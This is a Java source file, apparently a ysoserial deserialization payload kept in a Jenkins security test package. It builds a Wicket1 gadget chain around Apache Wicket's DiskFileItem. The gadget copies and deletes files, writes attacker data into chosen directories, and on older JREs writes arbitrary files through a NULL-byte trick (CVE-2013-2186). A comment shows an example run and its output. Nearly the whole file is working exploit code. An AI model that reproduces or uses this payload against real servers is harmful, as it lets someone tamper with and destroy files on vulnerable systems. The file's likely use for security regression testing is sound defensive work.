package jenkins.security.security218.ysoserial.payloads;


import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Arrays;

import org.apache.commons.codec.binary.Base64;
import org.apache.wicket.util.upload.DiskFileItem;
import org.apache.wicket.util.io.DeferredFileOutputStream;
import org.apache.wicket.util.io.ThresholdingOutputStream;

import jenkins.security.security218.ysoserial.payloads.annotation.Dependencies;
import jenkins.security.security218.ysoserial.payloads.util.PayloadRunner;
import jenkins.security.security218.ysoserial.payloads.util.Reflections;


/**
 * This gadget is almost identical to FileUpload1 since it appears
 * that Apache Wicket copied a version of Apache Commons DiskFileItem
 * prior to Pierre Ernst reporting CVE-2013-2186 (NULL byte attack). That
 * means that if the target is running less than Oracle Java 7 update 40
 * then the NULL byte attack is viable. Otherwise, copy and move attacks
 * always work.
 * 
 * This attack is valid for the 1.x and 6.x lines of Apache Wicket but
 * was fixed in 1.5.16 and 6.24.0 (released July 2016).
 * 
 *
 * Arguments:
 * - copyAndDelete;sourceFile;destDir
 * - write;destDir;ascii-data
 * - writeB64;destDir;base64-data
 * - writeOld;destFile;ascii-data
 * - writeOldB64;destFile;base64-data
 * 
 * Example:
 * Wicket1 "write;/tmp;blue lobster"
 * 
 * Result:
 * $ ls -l /tmp/
 * -rw-rw-r-- 1 albino_lobster albino_lobster   12 Jul 25 14:10 upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp
 * $ cat /tmp/upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp 
 * blue lobster
 */
@Dependencies({"wicket-util:wicket-util:6.23"})
public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {

    public DiskFileItem getObject(String command) throws Exception {

        String[] parts = command.split(";");

        if (parts.length != 3) {
        	throw new IllegalArgumentException("Bad command format.");
        }
        
        if ("copyAndDelete".equals(parts[0])) {
            return copyAndDelete(parts[1], parts[2]);
        }
        else if ("write".equals(parts[0])) {
            return write(parts[1], parts[2].getBytes("US-ASCII"));
        }
        else if ("writeB64".equals(parts[0]) ) {
            return write(parts[1], Base64.decodeBase64(parts[2]));
        }
        else if ("writeOld".equals(parts[0]) ) {
            return writeOldJRE(parts[1], parts[2].getBytes("US-ASCII"));
        }
        else if ("writeOldB64".equals(parts[0]) ) {
            return writeOldJRE(parts[1], Base64.decodeBase64(parts[2]));
        }
        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
    }

	public void release(DiskFileItem obj) throws Exception {	
	}

    private static DiskFileItem copyAndDelete ( String copyAndDelete, String copyTo ) throws IOException, Exception {
        return makePayload(0, copyTo, copyAndDelete, new byte[1]);
    }

    // writes data to a random filename (update_<per JVM random UUID>_<COUNTER>.tmp)
    private static DiskFileItem write ( String dir, byte[] data ) throws IOException, Exception {
        return makePayload(data.length + 1, dir, dir + "/whatever", data);
    }

    // writes data to an arbitrary file
    private static DiskFileItem writeOldJRE(String file, byte[] data) throws IOException, Exception {
        return makePayload(data.length + 1, file + "\0", file, data);
    }

    private static DiskFileItem makePayload(int thresh, String repoPath, String filePath, byte[] data) throws IOException, Exception {
        // if thresh < written length, delete outputFile after copying to repository temp file
        // otherwise write the contents to repository temp file
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository, null);
        File outputFile = new File(filePath);
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(thresh, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
        return diskFileItem;
    }

    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(FileUpload1.class, args);
    }
}